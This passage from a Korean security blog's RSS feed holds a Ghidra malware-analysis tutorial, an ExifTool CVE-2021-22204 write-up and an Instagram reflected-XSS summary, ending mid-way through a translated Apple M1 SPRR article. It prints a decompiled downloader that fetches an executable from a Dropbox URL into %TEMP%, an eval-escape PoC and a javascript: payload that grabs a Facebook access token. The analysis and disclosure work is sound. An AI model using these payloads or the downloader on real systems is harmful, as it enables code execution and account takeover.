local_60 = <span class="hljs-number">0</span>;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_4c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        local_50 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_38 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_64 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            iVar5 = (*local_4c)(local_28,local_3c,<span class="hljs-number">0x2000</span>,&amp;local_64);            <span class="hljs-keyword">if</span> ((iVar5 == <span class="hljs-number">0</span>) || (local_64 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*local_50)(local_48,local_3c,local_64,&amp;local_60,<span class="hljs-number">0</span>);          &#125;          pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          local_54 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_48);          (*local_54)(local_18);          (*local_54)(local_20);          (*local_54)(local_28);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>이 친구도 상당히 지저분하네요. 정리가 필요할 듯합니다. 아까 사용한 방법처럼 먼저 Handle과 함수 포인터들을 정리해줍시다!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2012.png"></p><p>하지만… <code>InternetOpenW</code>의 데이터 타입이 없다고 나옵니다. 흠… 뭐가 문제일까? Data Type Manager에서 찾아봅시다. <code>InternetOpenW()</code>는 <code>wininet.h</code>에 존재하는 함수이니 <code>wininet.h</code>가 있는지 확인을 해볼까요?</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2013.png"></p><p>없네요… 그럼 기능을 사용하지 못하는 걸까요? MSDN을 보고 손수 작성을 해야 하는 건가? 직접 헤더 파일을 추가해야 하는 건가? 직접 헤더 파일을 추가하는 방법도 있지만, 이런 WinAPI들의 아카이브 파일을 누군가 github에 올려놓았습니다!</p><p>저는 Visual Studio Community를 다운로드해서 해당 헤더 파일을 직접 추가하고자 하였으나 어떤 이유에서인지… 각종 reference를 찾아서 똑같이 해도 추가가 안되더라고요… 똑같은 행위를 반복하며 엔터를 계속 누르며 분노 게이지가 차고 있었습니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2014.png"></p><p>그러던 와중 아래의 github repo는 저에게 큰 도움이 되었죠!</p><p><a href="https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo">https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo</a></p><p>해당 프로그램은 32비트 바이너리이므로 <code>winapi_32.gdt</code> 파일을 다운로드합니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2015.png"></p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2016.png"></p><p>그 후 Data Type Manager의 우측 상단에 아래쪽 화살표 모양을 클릭한 후 Open File Archive를 클릭합니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2017.png"></p><p>그다음 다운로드한 gdt 파일을 열어주면 끝!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2018.png"></p><p>이제 추가가 되어 있는 모습을 확인할 수 있습니다… 후후 다른 함수 포인터들도 모두 적용하도록 하죠. 적용이 완료된 소스 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">download_ATAPIConfiguration</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE hModule;  <span class="hljs-keyword">int</span> iVar4;  <span class="hljs-keyword">size_t</span> temp_path_len;  undefined4 *puVar5;  uint uVar6;  LPCSTR pCVar7;  <span class="hljs-keyword">int</span> local_64;  undefined4 local_60;  undefined4 lpdwBufferLength;  uint lpBuffer;  FARPROC InternetCloseHandle_addr;  FARPROC WriteFile_addr;  FARPROC InternetReadFile_addr;  HANDLE local_48;  FARPROC CreateFileW_addr;  <span class="hljs-keyword">char</span> *temp_path;  <span class="hljs-keyword">void</span> *local_3c;  <span class="hljs-keyword">int</span> local_38;  FARPROC HttpSendRequestA_addr;  FARPROC InternetSetOptionW;  FARPROC InternetQueryOptionW_addr;  <span class="hljs-keyword">int</span> hInternet;  FARPROC HttpOpenRequestW_addr;  <span class="hljs-keyword">int</span> hConnect;  FARPROC InternetConnectW_addr;  <span class="hljs-keyword">int</span> local_18;  FARPROC InternetOpenW_addr;  HMODULE local_10;    local_10 = LoadLibraryA(<span class="hljs-string">&quot;wininet.dll&quot;</span>);  InternetOpenW_addr = GetProcAddress(local_10,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_18 = (*InternetOpenW_addr)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_18 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    InternetConnectW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    hConnect = (*InternetConnectW_addr)(local_18,<span class="hljs-string">L&quot;dl.dropboxusercontent.com&quot;</span>,<span class="hljs-number">0x1bb</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (hConnect == <span class="hljs-number">0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      HttpOpenRequestW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      hInternet = (*HttpOpenRequestW_addr)                            (hConnect,&amp;DAT_00413270,<span class="hljs-string">L&quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,                             <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (hInternet == <span class="hljs-number">0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        lpdwBufferLength = <span class="hljs-number">4</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetQueryOptionW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        iVar4 = (*InternetQueryOptionW_addr)(hInternet,<span class="hljs-number">0x1f</span>,&amp;lpBuffer,&amp;lpdwBufferLength);        <span class="hljs-keyword">if</span> (iVar4 != <span class="hljs-number">0</span>) &#123;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetSetOptionW = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          lpBuffer = lpBuffer | <span class="hljs-number">0x1180</span>;          (*InternetSetOptionW)(hInternet,<span class="hljs-number">0x1f</span>,&amp;lpBuffer,<span class="hljs-number">4</span>);        &#125;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        HttpSendRequestA_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_38 = (*HttpSendRequestA_addr)(hInternet,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        local_3c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_3c,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(download_path,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);        DAT_0041602c = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_0041602c,temp_path);        uVar6 = <span class="hljs-number">0xffffffff</span>;        pCVar7 = DAT_0041602c;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar6 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar6 = uVar6 - <span class="hljs-number">1</span>;          cVar1 = *pCVar7;          pCVar7 = pCVar7 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar5 = (undefined4 *)(DAT_0041602c + (~uVar6 - <span class="hljs-number">1</span>));        *puVar5 = <span class="hljs-number">0x4154415c</span>;        puVar5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x6f434950</span>;        puVar5[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6769666e</span>;        puVar5[<span class="hljs-number">3</span>] = <span class="hljs-number">0x74617275</span>;        puVar5[<span class="hljs-number">4</span>] = <span class="hljs-number">0x2e6e6f69</span>;        puVar5[<span class="hljs-number">5</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_0041602c,<span class="hljs-number">-1</span>,download_path,<span class="hljs-number">0x1000</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        CreateFileW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);                    <span class="hljs-comment">/* GENERIC_READ | GENERIC_WRITE */</span>        local_48 = (HANDLE)(*CreateFileW_addr)(download_path,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>);        local_60 = <span class="hljs-number">0</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetReadFile_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        WriteFile_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_38 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_64 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            iVar4 = (*InternetReadFile_addr)(hInternet,local_3c,<span class="hljs-number">0x2000</span>,&amp;local_64);            <span class="hljs-keyword">if</span> ((iVar4 == <span class="hljs-number">0</span>) || (local_64 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*WriteFile_addr)(local_48,local_3c,local_64,&amp;local_60,<span class="hljs-number">0</span>);          &#125;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetCloseHandle_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_48);          (*InternetCloseHandle_addr)(local_18);          (*InternetCloseHandle_addr)(hConnect);          (*InternetCloseHandle_addr)(hInternet);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>함수가 많이 기네요… 위에서부터 내려가 봅시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2019.png"></p><p><code>HttpOpenRequestW</code>를 통해 <code>dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration</code>에 연결합니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2020.png"></p><p>TEMP 폴더의 경로를 가져와 다운로드할 경로를 설정하는 것 같습니다. 근데 hex로 되어 있어서 확인하기 어렵네요. 디스 어셈블 창에서 Conver → Char Sequence로 어떤 문자열인지 확인해봅시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2021.png"></p><p><code>\\ATAPIConfiguration.exe\0</code>네요. 이제 경로 설정까지 했으니 파일을 읽어와 해당 경로에 생성하겠죠?</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2022.png"></p><p>빙고입니다. 정리하면 <code>download_ATAPIConfiguration()</code>은 <code>dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration</code>에 접속해서 <code>%TEMP%\ATAPIConfiguration.exe</code>로 파일을 다운로드한다!</p><h1 id="to-be-continued…"><a href="#to-be-continued…" class="headerlink" title="to be continued…"></a>to be continued…</h1><p>다음에는 ATAPIConfiguration에 대해서 다뤄볼 예정입니다. 원래 한 글에 모두 다 담으려 했는데 생각보다 많이 길어졌네요. 다른 분석은 모두 제외하고 ghidra를 사용한 정적 분석만 진행하는 것이라 틀린 내용이 존재할 수도 있습니다! 그럼 최대한 빨리 다음 파트를 준비해오도록 하겠습니다. 그럼 모두 안녕~</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://hackyboiz.github.io/tags/ghidra/">ghidra</category>
      
      <category domain="https://hackyboiz.github.io/tags/ransomware/">ransomware</category>
      
      <category domain="https://hackyboiz.github.io/tags/ghidra-tutorials/">ghidra tutorials</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-22204: ExifTool 임의 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/18/l0ch/2021-05-18/</link>
      <guid>https://hackyboiz.github.io/2021/05/18/l0ch/2021-05-18/</guid>
      <pubDate>Tue, 18 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://devcraft.io/2021/05/04/exiftool-arbitrary-code-ex</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">ExifTool CVE-2021-22204 - Arbitrary Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ExifTool </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>이미지 파일의 메타 데이터를 수정할 때 사용되는 ExifTool에서 임의 코드 실행 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>ExifTool은 perl 스크립트로 구현되었으며 취약점은 DjVu 파일을 파싱하는 <code>DjVu</code> 모듈의 <code>ParseAnt</code> 메서드에 존재합니다.</p><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">ParseAnt</span>($)</span><span class="hljs-function">...</span><span class="hljs-function">$<span class="hljs-title">tok</span> = &#x27;&#x27;</span>;  <span class="hljs-keyword">for</span> (;;) &#123;      <span class="hljs-comment"># get string up to the next quotation mark</span>      <span class="hljs-comment"># this doesn&#x27;t work in perl 5.6.2! grrrr</span>      <span class="hljs-comment"># last Tok unless $$dataPt =~ /(.*?)&quot;/sg;</span>      <span class="hljs-comment"># $tok .= $1;</span>      <span class="hljs-keyword">my</span> $pos = <span class="hljs-keyword">pos</span>($$dataPt);      <span class="hljs-keyword">last</span> Tok <span class="hljs-keyword">unless</span> $$dataPt =~ <span class="hljs-regexp">/&quot;/sg</span>;      $tok .= <span class="hljs-keyword">substr</span>($$dataPt, $pos, <span class="hljs-keyword">pos</span>($$dataPt)-<span class="hljs-number">1</span>-$pos);      <span class="hljs-comment"># we&#x27;re good unless quote was escaped by odd number of backslashes</span>      <span class="hljs-keyword">last</span> <span class="hljs-keyword">unless</span> $tok =~ <span class="hljs-regexp">/(\\\\+)$/</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">length</span>($1) &amp; <span class="hljs-number">0x01</span>;      $tok .= <span class="hljs-string">&#x27;&quot;&#x27;</span>;    <span class="hljs-comment"># quote is part of the string</span>  &#125;  <span class="hljs-comment"># must protect unescaped &quot;$&quot; and &quot;@&quot; symbols, and &quot;\\&quot; at end of string</span>  $tok =~ <span class="hljs-keyword">s</span>&#123;\\\\(.)|([\\$\\@]|\\\\$)&#125;&#123;<span class="hljs-string">&#x27;\\\\&#x27;</span>.($2 || $1)&#125;sge;  <span class="hljs-comment"># convert C escape sequences (allowed in quoted text)</span>  $tok = <span class="hljs-keyword">eval</span> <span class="hljs-string">qq&#123;&quot;$tok&quot;&#125;</span>;...</code></pre><p>위 코드는 C와 유사한 escape sequence를 구현한 코드로 <code>$tok</code> 변수의 특수 문자를 escape 처리한 뒤 이를 <code>eval</code> 함수에 전달합니다.</p><p>그러나 정규식 <code>tok =~ /(\\\\+)$/</code> 에서 <code>$</code>가 문자열의 끝과 개행을 의미해 백 슬래시와 개행 문자를 쓰면 문자열이 끝난 것으로 인식하고 개행 이후에 오는 특수 문자를 처리하지 않습니다. 따라서 <code>return data;</code> 코드를 실행하는 아래 PoC와 같이 <code>eval</code> 함수를 벗어나 임의 코드를 실행할 수 있습니다.</p><pre><code class="hljs python">(metadata    (Author <span class="hljs-string">&quot;\\</span><span class="hljs-string">&quot;</span> . <span class="hljs-keyword">return</span> `date`; <span class="hljs-comment">#&quot;)</span>)</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-code-execution/">arbitrary code execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/escape-sequence/">escape sequence</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/18/l0ch/2021-05-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Reflected XSS를 통한 인스타그램 계정 탈취</title>
      <link>https://hackyboiz.github.io/2021/05/17/idioth/2021-05-17/</link>
      <guid>https://hackyboiz.github.io/2021/05/17/idioth/2021-05-17/</guid>
      <pubDate>Mon, 17 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ysamm.com/?p=695&quot;&gt;One-click reflected XSS in www.</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ysamm.com/?p=695">One-click reflected XSS in www.instagram.com due to unfiltered URI schemes leads to account takeover</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="http://www.instagram.com/">www.instagram.com</a> 데스크톱 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>데스크톱 버전의 <a href="http://www.instagram.com/">www.instagram.com</a> 에서 필터링 되지 않은 URI 스키마를 통해 사용자가 탭을 열거나 닫는데 사용되는 마우스의 가운데 버튼을 클릭할 시 reflected XSS가 발생하는 취약점이 발견되었습니다.</p><p>해당 취약점은 취약한 엔드 포인트로 전달된 파라미터 내부의 페이로드가 <code>href</code> 속성의 html <code>a</code> 태그 내부에 반영되어 발생합니다. 페이로드는 <a href="http://www.instagram.com/">www.instagram.com</a> 에서 해커의 자바스크립트 코드를 실행하는 자바스크립트 URI 스키마이며 공격이 실패하더라도 이벤트 핸들러가 URL을 다른 포맷으로 변경합니다. 또한 사용자가 새로운 탭에서 URL을 열기 위해 마우스 가운데 버튼을 클릭하거나 왼쪽과 오른쪽을 동시에 누르는 경우에 XSS와 계정 탈취가 가능합니다. 새 탭에서 열 경우 URL을 변경하는 자바스크립트 코드를 우회하여 공격에 성공할 수 있습니다.</p><p>사용자가 <code>https://www.instagram.com/accounts/recovery/landing/?token=true&amp;next=javascript:fetch(“https://www.facebook.com/x/oauth/status?client_id=124024574287414&amp;input_token&amp;origin=1&amp;redirect_uri=https%3A%2F%2Fwww.instagram.com%2F&amp;sdk=joey&amp;wants_cookie_data=true“,&#123;mode:”cors”,credentials:”include”&#125;).then(function(a)&#123;alert(a.headers.get(“fb-ar”));console.log(a.headers.get(“fb-ar”));&#125;);</code> 링크에 접속할 경우 <code>/x/oauth/status</code> 페이스북 OAuth 엔드 포인트로부터 페이스북 액세스 토큰을 요청합니다. 액세스 토큰은 인스타그램 애플리케이션의 컨텍스트에서 생성되고 해당 액세스 토큰을 통해 페이스북 계정을 탈취할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/instagram/">instagram</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/17/idioth/2021-05-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] 애플 실리콘 하드웨어의 비밀: SPRR과 Guarded Exception Levels (GXF)</title>
      <link>https://hackyboiz.github.io/2021/05/16/idioth/apple_silicon_sprr_gxf/</link>
      <guid>https://hackyboiz.github.io/2021/05/16/idioth/apple_silicon_sprr_gxf/</guid>
      <pubDate>Sun, 16 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요. idioth입니다. ghidra로 악성코드 분석을 해온다는 녀석이 왜 글은 안 올리고 번역글을 쓰고 있냐고요? 사연이 있습니다. 본래 오늘 해당 글이 올라갔어야 했는데, 분석은 끝냈으나 이번 주 제가 아팠어서 어제 출근을 하였으나 계</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요. idioth입니다. ghidra로 악성코드 분석을 해온다는 녀석이 왜 글은 안 올리고 번역글을 쓰고 있냐고요? 사연이 있습니다. 본래 오늘 해당 글이 올라갔어야 했는데, 분석은 끝냈으나 이번 주 제가 아팠어서 어제 출근을 하였으나 계속되는 기침으로 인해 쫓겨났습니다.</p><p>여기서 제가 닉값을 해버렸죠. 크롬 원격 데스크톱을 설치해놓고 절전 설정을 안 건드려놔서 접근이 안됩니다.</p><p><img src="/2021/05/16/idioth/apple_silicon_sprr_gxf/Untitled.png"></p><p>어제 설정하고 지하철 타고 집에 오니 이렇게 되있네요. 아</p><p><img src="/2021/05/16/idioth/apple_silicon_sprr_gxf/Untitled%201.png"></p><p>얼른 집 컴퓨터를 업글을 해서 VM을 집 컴으로 돌리던가 해야겠어요… 요즘 같은 시국에 아프면 집에서 공부를 해야 하니까요! 아무튼 ㅜㅜ… ARM을 공부해볼까 하던 와중에 맥북 M1 칩이 등장하였고 그에 관련된 자료들이 눈에 보이면 잡지 읽는 느낌으로 읽곤 합니다. <del>사람 놀릴만한 버그는 없는지… 동생이 m1 에어를 쓰거든요.</del> ARM 아키텍처로 넘어오면서 스마트폰 등에 적용되어 있던 보호 기법들이 얼마나 들어올까?라는 궁금증이 있었는데, 이번 글이 동작 방식에 대해 어느 정도 의문을 해결해줄 거라 생각합니다!</p><p>번역에는 의역과 오역이 존재할 수 있습니다. 틀린 부분이나 이해하기 힘든 부분이 있다면 코멘트 달아주시면 감사드립니다.</p><blockquote><p>원문 글 : <a href="https://blog.svenpeter.dev/posts/m1_sprr_gxf/">Apple Silicon Hardware Secrets: SPRR and Guarded Exception Levels (GXF)</a></p></blockquote><h1 id="소개"><a href="#소개" class="headerlink" title="소개"></a>소개</h1><p>1년 전에 <a href="https://twitter.com/s1guza">siguza</a>는 페이지 테이블의 권한을 재정의하고 커널의 일부를 보호하는 커스텀 ARM extension <a href="https://siguza.github.io/APRR/">Apple APRR에 관한 write-up</a>을 작성했다. 이후 애플이 출시한 M1 칩은 업데이트된 APRR 뿐만 아니라 부팅 직후 베어 메탈 코드를 쉽게 실행할 수 있다. 새 버전에 대한 루머가 있지만 공식적인 자료는 아직 없다.</p><p>이 게시글의 첫 부분은 aarch64의 메모리 관리, 페이지 테이블, 유저/커널 모드에 대해 간략하게 소개하며 이전 Apple SoC와 같은 기능인 APRR도 요악한다. 이미 알고 있는 내용이라면 넘어가도 좋다.</p><p>위의 내용을 다루고 나서 SPRR과 GXF가 어떻게 작동하는지 다룬다. SPRR과 GXF가 무엇인지만 알고 싶으면 Asahi Linux 위키를 참고하면 된다.</p><h2 id="MMUs-pagetables-and-kernels"><a href="#MMUs-pagetables-and-kernels" class="headerlink" title="MMUs, pagetables, and kernels"></a>MMUs, pagetables, and kernels</h2><p>ARM CPU는 x86의 ring과 같은 <a href="https://developer.arm.com/documentation/102412/0100/Privilege-and-Exception-levels">exception levels</a>에서 실행된다. EL0은 애플리케이션이 실행되는 userspace이며 EL1은 커널이 실행되고 EL2는 하이퍼바이저가 실행된다. (펌웨어를 위한 EL3는 M1 칩에는 없다.)</p><p><a href="https://developer.arm.com/documentation/102142/latest/Virtualization-Host-Extensions">Virtualization Host Extensions</a>이 있는 ARM64 CPU는 EL2를 EL1처럼 만들어 커널을 쉽게 실행할 수 있다.</p><p>커널의 작업 중 하나는 유저 랜드에서 실행되는 각 애플리케이션에 종속되어 애플리케이션의 주소 공간을 알리는 것이다. 이는 Memory Management Unit이 수행한다. MMU는 가상 주소를 통해 실제 물리 주소를 관리할 수 있다. 이 매핑의 가장 작은 단위를 4 KiB 크기의 페이지라 하며 페이지에는 가장 주소와 실제 주소가 있다. 애플리케이션이나 커널이 <code>x</code> 위치의 메모리에 접근하려 하면 MMU는 페이지 테이블에서 페이지를 확인하고 <code>y</code> 주소에서 메모리를 반환한다. 커널은 유저 랜드 애플리케이션의 각 프로세스에 대해 다른 페이지 테이블 세트를 생성하여 별도의 주소 공간을 제공한다.</p><p>이 매핑 외에도 각 페이지는 특정 액세스 플래그를 인코딩하는 4 비트가 존재한다. 이 플래그는 페이지의 읽기 쓰기 권한이나 유저 랜드 애플리케이션 혹은 커널이 페이지에서 코드를 실행할 수 있는지를 결정한다. ARMv8-A CPU의 각 페이지 테이블 항목에서 4 비트를 찾을 수 있다.</p><ul><li><em>UXN</em>, Unprivileged Execute never: 이 페이지에서 유저 랜드 (EL0) 코드를 실행할 수 없음</li><li><em>PXN</em>, Prvileged excute never: 이 페이지에서 커널 (EL1) 코드를 실행할 수 없음</li><li><em>AP0</em> and <em>AP1</em>:  커널과 유저 랜드에 <code>rw/--</code>, <code>rw/rw</code>, <code>r-/--</code>, <code>r-/r-</code>  읽기, 쓰기 접근 권한을 인코딩</li></ul><p>마지막 액세스 플래그를 결정하는데 추가적인 복잡함(PAN, 계층 제어)이 있지만 이 게시글에서는 다루지 않는다. 유저 랜드와 커널의 권한이 연관이 있다는 점을 주의해야 한다. 유저랜드는 <code>rw</code>이지만 커널에는 <code>r-</code>로 페이지를 설정하는 것은 불가능하다.</p><h2 id="APRR"><a href="#APRR" class="headerlink" title="APRR"></a>APRR</h2><p>각 페이지에는 EL0/1(유저/커널 모드)에 대한 접근 권한(읽기/쓰기/실행)을 제어하는 4개의 플래그가 있다. APRR은 페이지 테이블 엔트리에 4개의 플래그를 저장하는 것 대신에 별도의 테이블에 대한 인덱스로 변경한다.(액세스 권한을 직접 인코딩하는 대신 4비트 index [AP1][AP0]PXN][UXN]으로 병합된다.) 이 별도의 테이블은 페이지의 실제 권한을 인코딩한다. 게다가 일부 레지스터는 userspace의 이러한 권한을 추가로 제한할 수 있다. 이러한 레지스터들은 커널과 유저 랜드에서 분리되어 있고 페이지 권한을 만들 때 유연성을 제공한다.</p><p>보통 모든 개별 엔트리를 수정하려면 많은 page walk가 필요하지만, APRR은 이러한 방식으로 페이지 테이블 권한에 대한 간접적인 계층을 도입하여 단일 레지스터 쓰기로 많은 페이지 권한을 효율적으로 수정할 수 있다.</p><p>더 자세한 사항은 <a href="https://siguza.github.io/APRR/">siguza의 write-up</a>에서 확인할 수 있다.</p><h2 id="Just-In-Time-컴파일러"><a 